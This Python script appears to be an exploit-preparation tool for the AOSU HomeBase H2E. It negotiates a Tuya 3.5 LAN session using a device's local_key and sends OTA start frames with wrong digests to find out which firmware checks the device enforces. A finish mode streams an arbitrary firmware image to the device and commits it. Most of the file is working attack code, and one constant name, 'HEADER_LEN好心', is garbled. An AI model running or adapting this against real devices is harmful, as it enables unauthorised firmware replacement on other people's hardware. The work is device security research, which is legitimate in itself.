#!/usr/bin/env python3
"""EV-pack-H-003 — ready-to-run LAN OTA `0x1A` probe for the AOSU HomeBase H2E.

Speaks Tuya 3.5 on 6668 with the 18-byte `lpv35_fixed_head_t` header
(prefix | version:4|reserved:4 | reserved2 | seq | cmd | len, GCM AAD = header[4:18])
and fires ONE `FRM_LAN_OTA_START (0x1A)` frame whose descriptor is deliberately
unusable, so the reply says which gate the device actually enforces:

    retcode 1 + ASCII reason        -> body shape wrong (nothing written; try the other candidate)
    retcode 0, then OTA fault 45/49 -> shape right, digest rejected
    retcode 0, silence              -> accepted; re-run with a real image

`0x1A` only ANNOUNCES an image, so a wrong digest costs no flash write.

Usage:
    ./ev-pack-h-003-send-ota-start.py --key <32 hex>              # candidate B (default)
    ./ev-pack-h-003-send-ota-start.py --key <32 hex> --candidate A
    ./ev-pack-h-003-send-ota-start.py --key <32 hex> --dry        # hex only, no socket
    ./ev-pack-h-003-send-ota-start.py --selftest                  # no device, no key

Candidate B is the default: `TUYA_OTA_FIRMWARE_INFO_T { uint32_t len; uint32_t crc32;
uint8_t md5[16]; }` = 24 bytes (`tuya_cloud_types.h:1252-1256`). See the pack's
"LAN OTA" section for why both candidates exist and why neither carries an hmac.

Budget: `ALLOW_NO_KEY_NUM 3` frames per connection are tolerated keyed by the
local_key instead of the session key, and `CLIENT_LIMT 3` clients overall — the
negotiation here is single-shot and every later frame uses the session key.
"""

import argparse
import hashlib
import hmac
import json
import os
import socket
import struct
import sys
import zlib

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

PREFIX = bytes.fromhex("00006699")
SUFFIX = bytes.fromhex("00009966")
HEADER_LEN好心 = 18
HEADER_LEN = 18                      # 4 magic + 2 reserved + 4 seq + 4 cmd + 4 len
AAD = slice(4, HEADER_LEN)
CMD_NEG_START, CMD_NEG_RESP, CMD_NEG_FINISH = 0x03, 0x04, 0x05
CMD_OTA_START = 0x1A
CMD_OTA_DATA = 0x1B
CMD_OTA_FINISH = 0x1C
ZERO_RC = b"\x00\x00\x00\x00"
FAKE_IMAGE = b"\x00" * 512
OTA_CHUNK = 512                      # sequencer data-chunk size (stop-and-wait, one in flight)


def ota_start_body_b(image, md5_digest=None):
    """24-byte TUYA_OTA_FIRMWARE_INFO_T {len, crc32, md5[16]} (tuya_cloud_types.h:1252).

    md5_digest overrides the image digest (the sequencer passes a deliberately wrong one)."""
    md5 = md5_digest or hashlib.md5(image).digest()
    return struct.pack(">II", len(image), zlib.crc32(image) & 0xFFFFFFFF) + md5


def ota_data_frame_bytes(image, offset, chunk=None, total_len=None):
    """TUYA_OTA_DATA_T payload (tkl_ota.h:55): {total_len, offset, data[], len}."""
    chunk = OTA_CHUNK if chunk is None else chunk
    part = image[offset:offset + chunk]
    total = total_len if total_len is not None else len(image)
    return struct.pack(">II", total, offset) + part


def pad_block16(image):
    """Zero-pad to a multiple of 16 — the device-side decrypt path crashes on
    non-block-aligned content (measured via tools/thing-sign/ext_acceptance.py)."""
    rem = len(image) % 16
    return image + b"\x00" * (16 - rem) if rem else image


def seal(seq, cmd, raw, key, retcode=ZERO_RC):
    """One sealed 6699 frame. `raw` excludes the retcode, which is prepended."""
    iv = os.urandom(12)
    body = retcode + raw
    hdr = PREFIX + b"\x00\x00" + struct.pack(">III", seq, cmd, 12 + len(body) + 16)
    return hdr + iv + AESGCM(key).encrypt(iv, body, hdr[AAD]) + SUFFIX


def open_frame(data, key, with_retcode=True):
    """Verify + decrypt an inbound frame; returns (retcode|None, plaintext)."""
    if data[:4] != PREFIX or data[-4:] != SUFFIX:
        raise ValueError("not a 6699 frame")
    length = struct.unpack(">I", data[14:18])[0]
    iv, sealed = data[18:30], data[30:-4]      # sealed = ciphertext || tag(16)
    if len(sealed) != length - 12:          # declared length covers iv + ct + tag
        raise ValueError("length mismatch: declared %d, have %d" % (length, len(sealed) + 12))
    raw = AESGCM(key).decrypt(iv, sealed, data[AAD])
    return (raw[:4] if with_retcode else None), (raw[4:] if with_retcode else raw)


def candidate_b():
    """24-byte descriptor: correct len, correct crc32, deliberately wrong md5."""
    return ota_start_body_b(FAKE_IMAGE, md5_digest=b"\xde\xad\xbe\xef" * 4)


def candidate_a():
    """The cloud descriptor as JSON. `httpsUrl` is mandatory (unchecked ->valuestring)."""
    md5 = hashlib.md5(FAKE_IMAGE).hexdigest()
    return json.dumps({
        "type": 1,
        "size": str(len(FAKE_IMAGE)),
        "httpsUrl": "https://127.0.0.1:9/none",
        "hmac": "0" * 64,
        "md5": md5[:-1] + ("0" if md5[-1] != "0" else "1"),
    }).encode()


def recv_frame(sock):
    """Read exactly one frame, honouring the declared length."""
    def take(n):
        out = b""
        while len(out) < n:
            chunk = sock.recv(n - len(out))
            if not chunk:
                raise SystemExit("peer closed mid-frame")
            out += chunk
        return out

    head = take(HEADER_LEN)
    return head + take(struct.unpack(">I", head[14:18])[0] + 4)


def negotiate(sock, local_key):
    """Single-shot 0x03 -> 0x04 -> 0x05. Returns the session key."""
    client_nonce = os.urandom(16)
    sock.sendall(seal(1, CMD_NEG_START, client_nonce, local_key, retcode=b""))
    rc, payload = open_frame(recv_frame(sock), local_key)
    if rc != ZERO_RC:
        raise SystemExit("negotiation rejected: retcode %s" % rc.hex())
    if len(payload) < 48:
        raise SystemExit("short negotiation response (%d B, want 48)" % len(payload))
    device_nonce, proof = payload[:16], payload[16:48]
    if proof != hmac.new(local_key, client_nonce, hashlib.sha256).digest():
        raise SystemExit("DEVICE PROOF INVALID - wrong local_key")
    x = bytes(a ^ b for a, b in zip(client_nonce, device_nonce))
    session_key = AESGCM(local_key).encrypt(client_nonce[:12], x, None)[:16]
    sock.sendall(seal(2, CMD_NEG_FINISH,
                      hmac.new(local_key, device_nonce, hashlib.sha256).digest(),
                      local_key, retcode=b""))
    return session_key


def run_sequence(sock, session_key):
    """Wrong-shape-then-wrong-digest sequencer (docs/exploit/aosu-lan-ota-prep.md §2).

    0x1A wrong md5 -> 0x1B wrong content -> STOP before 0x1C. A parse-failed start poisons
    the session's OTA state, so a shape rejection aborts before any data frame; a digest
    rejection is allowed through only to record the fault code. The finish frame (0x1C) is
    never sent here: with a rejected digest it either no-ops or schedules a bad-image switch.
    """
    print("# seq step 1: 0x1A candidate B (wrong md5 by construction)")
    sock.sendall(seal(3, CMD_OTA_START, candidate_b(), session_key))
    try:
        frame = recv_frame(sock)
    except SystemExit:
        print("0x1A -> SILENCE; session-level problem, not OTA. Stop.")
        return 1
    rc, payload = open_frame(frame, session_key)
    print("0x1A -> retcode %s" % rc.hex())
    if rc != ZERO_RC:
        print("  reason: %r" % payload.decode("utf-8", "replace"))
        print("  => SHAPE wrong. Re-run with --candidate A (single shot). No 0x1B sent.")
        return 0
    print("# seq step 2: 0x1B one %d B zero chunk (wrong content)" % OTA_CHUNK)
    body = ota_data_frame_bytes(FAKE_IMAGE, 0)
    sock.sendall(seal(4, CMD_OTA_DATA, body, session_key))
    try:
        frame = recv_frame(sock)
    except SystemExit:
        print("0x1B -> SILENCE (no ack): shape may be accepted but unconfirmed; log and stop.")
        return 0
    rc, payload = open_frame(frame, session_key)
    print("0x1B -> retcode %s" % rc.hex())
    if rc != ZERO_RC:
        print("  reason: %r" % payload.decode("utf-8", "replace"))
        print("  => 0x1B struct drift vs tkl_ota.h:55. Log the reason; nothing written.")
        return 0
    print("  => 0x1B shape accepted (digest wrong). Watch for OTA fault:")
    print("     45 = download HMAC  49 = upgrade HMAC  (docs/exploit/aosu-lan-ota-prep.md §1)")
    print("# seq STOP: 0x1C not sent with a rejected digest (aosu-lan-ota-prep.md §2).")
    return 0


def run_finish(sock, session_key, image):
    """Stream the padded image as 0x1B chunks (stop-and-wait), then send 0x1C.

    Preconditions: the 0x1A just announced THIS image with its CORRECT digest and was
    accepted. This is the first [WRITE][RISK] path of the lane."""
    n_chunks = (len(image) + OTA_CHUNK - 1) // OTA_CHUNK
    for i in range(n_chunks):
        off = i * OTA_CHUNK
        sock.sendall(seal(4 + i, CMD_OTA_DATA, ota_data_frame_bytes(image, off), session_key))
        try:
            frame = recv_frame(sock)
        except SystemExit:
            print("0x1B chunk %d/%d -> SILENCE (peer closed mid-stream)" % (i + 1, n_chunks))
            return 1
        rc, payload = open_frame(frame, session_key)
        if rc != ZERO_RC:
            print("0x1B chunk %d/%d -> retcode %s reason %r"
                  % (i + 1, n_chunks, rc.hex(), payload.decode("utf-8", "replace")))
            return 1
        print("0x1B chunk %d/%d acked (offset %d)" % (i + 1, n_chunks, off))
    sock.sendall(seal(4 + n_chunks, CMD_OTA_FINISH, b"", session_key))
    try:
        frame = recv_frame(sock)
        rc, payload = open_frame(frame, session_key)
        print("0x1C -> retcode %s %s" % (rc.hex(), payload.decode("utf-8", "replace")[:80]))
    except SystemExit:
        print("0x1C -> SILENCE (device may reboot into the new image now)")
    print("# image stream complete. Verify the boot bank before declaring success.")
    return 0


def selftest():
    key = bytes(range(16))
    body = candidate_b()
    frame = seal(7, CMD_OTA_START, body, key)
    assert frame[:4] == PREFIX and frame[-4:] == SUFFIX
    assert frame[4:6] == b"\x00\x00", "reserved pair must be two zero bytes"
    assert struct.unpack(">I", frame[14:18])[0] == 12 + 4 + len(body) + 16
    rc, back = open_frame(frame, key)
    assert rc == ZERO_RC and back == body, "round-trip mismatch"
    assert len(body) == 24 and len(candidate_a()) > 24
    # 0x1B builder round-trip: header fields + chunk identity + struct shape
    img = FAKE_IMAGE
    db = ota_data_frame_bytes(img, 0)
    total, off = struct.unpack(">II", db[:8])
    assert total == len(img) and off == 0, "0x1B header fields wrong"
    assert db[8:8 + OTA_CHUNK] == img[:OTA_CHUNK], "0x1B chunk bytes wrong"
    dframe = seal(8, CMD_OTA_DATA, db, key)
    rc2, dback = open_frame(dframe, key)
    assert rc2 == ZERO_RC and dback == db, "0x1B round-trip mismatch"
    # tail chunk shorter than the window, and block-16 padding rule
    tail = ota_data_frame_bytes(img, OTA_CHUNK, chunk=OTA_CHUNK)
    assert struct.unpack(">II", tail[:8]) == (len(img), OTA_CHUNK)
    assert len(pad_block16(b"x" * 27)) == 32 and len(pad_block16(b"x" * 32)) == 32
    # 0x1C is an empty-payload frame; round-trips as bare retcode
    fframe = seal(9, CMD_OTA_FINISH, b"", key)
    rc3, fback = open_frame(fframe, key)
    assert rc3 == ZERO_RC and fback == b"", "0x1C round-trip mismatch"
    print("selftest ok: 18 B header, reserved pair, AAD [4:18], len=12+4+24+16, round-trips"
          " clean (0x1A 24B, 0x1B chunked, 0x1C empty), block-16 pad rule")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.4.37")
    ap.add_argument("--port", type=int, default=6668)
    ap.add_argument("--key", help="local_key, 32 hex chars")
    ap.add_argument("--candidate", choices=("A", "B"), default="B")
    ap.add_argument("--sequence", action="store_true",
                    help="wrong-shape 0x1A then wrong-digest 0x1B on one connection; "
                         "stops before 0x1C (docs/exploit/aosu-lan-ota-prep.md §2)")
    ap.add_argument("--image", help="real image file for a --finish run (WRITE RISK)")
    ap.add_argument("--finish", action="store_true",
                    help="after an accepted 0x1A with a CORRECT digest, stream the image "
                         "as 0x1B chunks and send 0x1C — the first real write path")
    ap.add_argument("--dry", action="store_true", help="print the frame, do not connect")
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--timeout", type=float, default=8.0)
    args = ap.parse_args()

    if args.selftest:
        return selftest()
    if not args.key:
        ap.error("--key is required (or --selftest)")
    local_key = bytes.fromhex(args.key)
    if len(local_key) != 16:
        ap.error("--key must be 16 bytes / 32 hex chars")

    body = candidate_b() if args.candidate == "B" else candidate_a()
    if args.finish:
        if not args.image:
            ap.error("--finish needs --image")
        image = pad_block16(open(args.image, "rb").read())
        print("# [WRITE][RISK] finish run: %d B image (+pad) as %d B chunks, then 0x1C"
              % (len(image), OTA_CHUNK))
        body = ota_start_body_b(image)          # CORRECT digest — the real announce
        wrong_digest = False
    else:
        wrong_digest = True
    print("# candidate %s: %d B body%s" % (args.candidate, len(body),
          " over a 512 B fake image, digest deliberately wrong" if wrong_digest else ""))

    if args.dry:
        # Body considers no session: sealed with a stand-in key/iv so the bytes are inspectable.
        print(seal(3, CMD_OTA_START, body, local_key).hex())
        if args.image:
            print("# first 0x1B chunk:")
            print(seal(4, CMD_OTA_DATA, ota_data_frame_bytes(image, 0), local_key).hex())
            print("# 0x1C finish (empty payload):")
            print(seal(5, CMD_OTA_FINISH, b"", local_key).hex())
        return 0

    with socket.create_connection((args.host, args.port), args.timeout) as sock:
        sock.settimeout(args.timeout)
        try:
            session_key = negotiate(sock, local_key)
        except (TimeoutError, socket.timeout):
            raise SystemExit("no negotiation response: wrong local_key, or the 6668 "
                             "accept backlog is wedged - retry with backoff")
        print("# session established")
        if args.sequence:
            return run_sequence(sock, session_key)
        sock.sendall(seal(3, CMD_OTA_START, body, session_key))
        try:
            frame = recv_frame(sock)
        except SystemExit:
            print("0x1A -> SILENCE (accepted, no reply: nothing to parse back)")
            return 0
        rc, payload = open_frame(frame, session_key)
        print("0x1A -> retcode %s" % rc.hex())
        if rc != ZERO_RC:
            print("  reason: %r" % payload.decode("utf-8", "replace"))
            print("  => body SHAPE wrong. Nothing was written; try --candidate %s"
                  % ("A" if args.candidate == "B" else "B"))
            return 0
        if args.finish:
            return run_finish(sock, session_key, image)
        print("  => shape accepted. Watch this session for an OTA fault:")
        print("     45 = download HMAC  49 = upgrade HMAC (digest-gated)")
        print("     no fault           = digest ignored (local_key alone is enough)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
